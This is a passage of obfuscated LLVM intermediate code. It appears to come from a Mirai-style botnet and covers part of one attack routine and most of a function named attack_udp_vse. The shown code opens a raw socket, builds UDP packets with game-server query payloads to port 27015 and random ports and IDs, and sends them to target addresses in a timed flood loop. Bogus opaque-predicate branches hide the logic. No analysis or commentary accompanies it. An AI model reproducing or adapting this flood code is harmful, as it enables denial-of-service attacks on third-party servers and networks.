; <label>:368:                                    ; preds = %321
  %369 = load i32, i32* @x.27
  %370 = load i32, i32* @y.28
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %368
  %377 = load i32, i32* %11, align 4
  %378 = add nsw i32 %377, 1
  store i32 %378, i32* %11, align 4
  %379 = load i32, i32* @x.27
  %380 = load i32, i32* @y.28
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart231, label %originalBB21alteredBB

originalBBpart231:                                ; preds = %originalBB21
  br label %228

; <label>:387:                                    ; preds = %228
  %388 = call i64 @time(i64* null) #6
  %389 = load i32, i32* %23, align 4
  %390 = sext i32 %389 to i64
  %391 = icmp sgt i64 %388, %390
  br i1 %391, label %392, label %393

; <label>:392:                                    ; preds = %387
  br label %394

; <label>:393:                                    ; preds = %387
  br label %227

; <label>:394:                                    ; preds = %392, %originalBBpart2, %83
  %395 = load i32, i32* @x.27
  %396 = load i32, i32* @y.28
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %394
  %403 = load i32, i32* @x.27
  %404 = load i32, i32* @y.28
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %89
  %411 = load i32, i32* %12, align 4
  %412 = call i32 @close(i32 %411)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %158
  %413 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %414 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 4
  store i16 %413, i16* %415, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %207
  %416 = load i32, i32* %11, align 4
  %_ = sub i32 %416, 1
  %gen = mul i32 %_, 1
  %_7 = sub i32 %416, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %416, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 %416, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %416, 1
  %gen14 = mul i32 %_13, 1
  %_15 = sub i32 0, %416
  %gen16 = add i32 %_15, 1
  %_17 = shl i32 %416, 1
  %417 = add nsw i32 %416, 1
  store i32 %417, i32* %11, align 4
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %368
  %418 = load i32, i32* %11, align 4
  %_22 = sub i32 0, %418
  %gen23 = add i32 %_22, 1
  %_24 = sub i32 %418, 1
  %gen25 = mul i32 %_24, 1
  %_26 = shl i32 %418, 1
  %_27 = sub i32 %418, 1
  %gen28 = mul i32 %_27, 1
  %_29 = shl i32 %418, 1
  %419 = add nsw i32 %418, 1
  store i32 %419, i32* %11, align 4
  br label %originalBB21

originalBB33alteredBB:                            ; preds = %originalBB33, %394
  br label %originalBB33
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %83

; <label>:66:                                     ; preds = %5
  %67 = load i32, i32* @x.29
  %68 = load i32, i32* @y.30
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %66
  %75 = load i32, i32* @x.29
  %76 = load i32, i32* @y.30
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %478

; <label>:83:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %84 = load i32, i32* %12, align 4
  %85 = bitcast i32* %11 to i8*
  %86 = call i32 @setsockopt(i32 %84, i32 0, i32 3, i8* %85, i32 4) #6
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %91

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* %12, align 4
  %90 = call i32 @close(i32 %89)
  br label %478

; <label>:91:                                     ; preds = %83
  %92 = load i32, i32* @x.29
  %93 = load i32, i32* @y.30
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %91
  store i32 0, i32* %11, align 4
  %100 = load i32, i32* @x.29
  %101 = load i32, i32* @y.30
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %108

; <label>:108:                                    ; preds = %232, %originalBBpart24
  %109 = load i32, i32* %11, align 4
  %110 = load i8, i8* %7, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %235

; <label>:113:                                    ; preds = %108
  %114 = load i32, i32* @x.29
  %115 = load i32, i32* @y.30
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = call noalias i8* @calloc(i64 128, i64 1) #6
  %123 = load i8**, i8*** %13, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  store i8* %122, i8** %126, align 8
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %23, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.udphdr*
  store %struct.udphdr* %135, %struct.udphdr** %24, align 8
  %136 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %137 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %136, i64 1
  %138 = bitcast %struct.udphdr* %137 to i8*
  store i8* %138, i8** %25, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, 15
  %143 = or i8 %142, 64
  store i8 %143, i8* %140, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, -16
  %148 = or i8 %147, 5
  store i8 %148, i8* %145, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 1
  store i8 %149, i8* %151, align 1
  %152 = load i32, i32* %21, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 32, %153
  %155 = trunc i64 %154 to i16
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 2
  store i16 %156, i16* %158, align 2
  %159 = load i16, i16* %15, align 2
  %160 = call zeroext i16 @htons(i16 zeroext %159) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 3
  store i16 %160, i16* %162, align 4
  %163 = load i8, i8* %16, align 1
  %164 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 5
  store i8 %163, i8* %165, align 4
  %166 = load i8, i8* %17, align 1
  %167 = icmp ne i8 %166, 0
  %168 = load i32, i32* @x.29
  %169 = load i32, i32* @y.30
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart240, label %originalBB6alteredBB

originalBBpart240:                                ; preds = %originalBB6
  br i1 %167, label %176, label %180

; <label>:176:                                    ; preds = %originalBBpart240
  %177 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 4
  store i16 %177, i16* %179, align 2
  br label %180

; <label>:180:                                    ; preds = %176, %originalBBpart240
  %181 = load i32, i32* @x.29
  %182 = load i32, i32* @y.30
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %180
  %189 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 6
  store i8 17, i8* %190, align 1
  %191 = load i32, i32* @LOCAL_ADDR, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 8
  store i32 %191, i32* %193, align 4
  %194 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 9
  store i32 %199, i32* %201, align 4
  %202 = load i16, i16* %18, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 2
  %206 = load i16, i16* %19, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %209 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %208, i32 0, i32 1
  store i16 %207, i16* %209, align 2
  %210 = load i32, i32* %21, align 4
  %211 = sext i32 %210 to i64
  %212 = add i64 12, %211
  %213 = trunc i64 %212 to i16
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 2
  store i16 %214, i16* %216, align 2
  %217 = load i8*, i8** %25, align 8
  %218 = bitcast i8* %217 to i32*
  store i32 -1, i32* %218, align 4
  %219 = load i8*, i8** %25, align 8
  %220 = getelementptr inbounds i8, i8* %219, i64 4
  store i8* %220, i8** %25, align 8
  %221 = load i8*, i8** %25, align 8
  %222 = load i8*, i8** %20, align 8
  %223 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %221, i8* %222, i32 %223)
  %224 = load i32, i32* @x.29
  %225 = load i32, i32* @y.30
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart254, label %originalBB42alteredBB

originalBBpart254:                                ; preds = %originalBB42
  br label %232

; <label>:232:                                    ; preds = %originalBBpart254
  %233 = load i32, i32* %11, align 4
  %234 = add nsw i32 %233, 1
  store i32 %234, i32* %11, align 4
  br label %108

; <label>:235:                                    ; preds = %108
  %236 = load i32, i32* @x.29
  %237 = load i32, i32* @y.30
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %235
  %244 = load i32, i32* @x.29
  %245 = load i32, i32* @y.30
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %252

; <label>:252:                                    ; preds = %477, %originalBBpart258
  %253 = load i32, i32* @x.29
  %254 = load i32, i32* @y.30
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %252
  store i32 0, i32* %11, align 4
  %261 = load i32, i32* @x.29
  %262 = load i32, i32* @y.30
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %269

; <label>:269:                                    ; preds = %originalBBpart297, %originalBBpart262
  %270 = load i32, i32* %11, align 4
  %271 = load i8, i8* %7, align 1
  %272 = zext i8 %271 to i32
  %273 = icmp slt i32 %270, %272
  br i1 %273, label %274, label %471

; <label>:274:                                    ; preds = %269
  %275 = load i32, i32* @x.29
  %276 = load i32, i32* @y.30
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %274
  %283 = load i8**, i8*** %13, align 8
  %284 = load i32, i32* %11, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds i8*, i8** %283, i64 %285
  %287 = load i8*, i8** %286, align 8
  store i8* %287, i8** %26, align 8
  %288 = load i8*, i8** %26, align 8
  %289 = bitcast i8* %288 to %struct.iphdr*
  store %struct.iphdr* %289, %struct.iphdr** %27, align 8
  %290 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i64 1
  %292 = bitcast %struct.iphdr* %291 to %struct.udphdr*
  store %struct.udphdr* %292, %struct.udphdr** %28, align 8
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = icmp slt i32 %299, 32
  %301 = load i32, i32* @x.29
  %302 = load i32, i32* @y.30
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %300, label %309, label %330

; <label>:309:                                    ; preds = %originalBBpart266
  %310 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 %315) #7
  %317 = call i32 @rand_next()
  %318 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %319 = load i32, i32* %11, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i64 %320
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i32 0, i32 2
  %323 = load i8, i8* %322, align 4
  %324 = zext i8 %323 to i32
  %325 = lshr i32 %317, %324
  %326 = add i32 %316, %325
  %327 = call i32 @htonl(i32 %326) #7
  %328 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  store i32 %327, i32* %329, align 4
  br label %330

; <label>:330:                                    ; preds = %309, %originalBBpart266
  %331 = load i32, i32* @x.29
  %332 = load i32, i32* @y.30
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %330
  %339 = load i16, i16* %15, align 2
  %340 = zext i16 %339 to i32
  %341 = icmp eq i32 %340, 65535
  %342 = load i32, i32* @x.29
  %343 = load i32, i32* @y.30
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %341, label %350, label %355

; <label>:350:                                    ; preds = %originalBBpart270
  %351 = call i32 @rand_next()
  %352 = trunc i32 %351 to i16
  %353 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 3
  store i16 %352, i16* %354, align 4
  br label %355

; <label>:355:                                    ; preds = %350, %originalBBpart270
  %356 = load i16, i16* %18, align 2
  %357 = zext i16 %356 to i32
  %358 = icmp eq i32 %357, 65535
  br i1 %358, label %359, label %364

; <label>:359:                                    ; preds = %355
  %360 = call i32 @rand_next()
  %361 = trunc i32 %360 to i16
  %362 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i32 0, i32 0
  store i16 %361, i16* %363, align 2
  br label %364

; <label>:364:                                    ; preds = %359, %355
  %365 = load i16, i16* %19, align 2
  %366 = zext i16 %365 to i32
  %367 = icmp eq i32 %366, 65535
  br i1 %367, label %368, label %389

; <label>:368:                                    ; preds = %364
  %369 = load i32, i32* @x.29
  %370 = load i32, i32* @y.30
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %368
  %377 = call i32 @rand_next()
  %378 = trunc i32 %377 to i16
  %379 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %380 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load i32, i32* @x.29
  %382 = load i32, i32* @y.30
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %389

; <label>:389:                                    ; preds = %originalBBpart274, %364
  %390 = load i32, i32* @x.29
  %391 = load i32, i32* @y.30
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %389
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 7
  store i16 0, i16* %399, align 2
  %400 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %401 = bitcast %struct.iphdr* %400 to i16*
  %402 = call zeroext i16 @checksum_generic(i16* %401, i32 20)
  %403 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 7
  store i16 %402, i16* %404, align 2
  %405 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %406 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %405, i32 0, i32 3
  store i16 0, i16* %406, align 2
  %407 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %408 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %409 = bitcast %struct.udphdr* %408 to i8*
  %410 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %411 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %410, i32 0, i32 2
  %412 = load i16, i16* %411, align 2
  %413 = load i32, i32* %21, align 4
  %414 = sext i32 %413 to i64
  %415 = add i64 12, %414
  %416 = trunc i64 %415 to i32
  %417 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %407, i8* %409, i16 zeroext %412, i32 %416)
  %418 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %419 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %418, i32 0, i32 3
  store i16 %417, i16* %419, align 2
  %420 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %421 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %420, i32 0, i32 1
  %422 = load i16, i16* %421, align 2
  %423 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %424 = load i32, i32* %11, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i64 %425
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %426, i32 0, i32 0
  %428 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %427, i32 0, i32 1
  store i16 %422, i16* %428, align 2
  %429 = load i32, i32* %12, align 4
  %430 = load i8*, i8** %26, align 8
  %431 = load i32, i32* %21, align 4
  %432 = sext i32 %431 to i64
  %433 = add i64 32, %432
  %434 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %435 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %436 = load i32, i32* %11, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i64 %437
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %438, i32 0, i32 0
  %440 = bitcast %struct.sockaddr_in* %439 to %struct.sockaddr*
  store %struct.sockaddr* %440, %struct.sockaddr** %434, align 8
  %441 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %442 = load %struct.sockaddr*, %struct.sockaddr** %441, align 8
  %443 = call i64 @sendto(i32 %429, i8* %430, i64 %433, i32 16384, %struct.sockaddr* %442, i32 16)
  %444 = load i32, i32* @x.29
  %445 = load i32, i32* @y.30
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart289, label %originalBB76alteredBB

originalBBpart289:                                ; preds = %originalBB76
  br label %452

; <label>:452:                                    ; preds = %originalBBpart289
  %453 = load i32, i32* @x.29
  %454 = load i32, i32* @y.30
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %452
  %461 = load i32, i32* %11, align 4
  %462 = add nsw i32 %461, 1
  store i32 %462, i32* %11, align 4
  %463 = load i32, i32* @x.29
  %464 = load i32, i32* @y.30
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
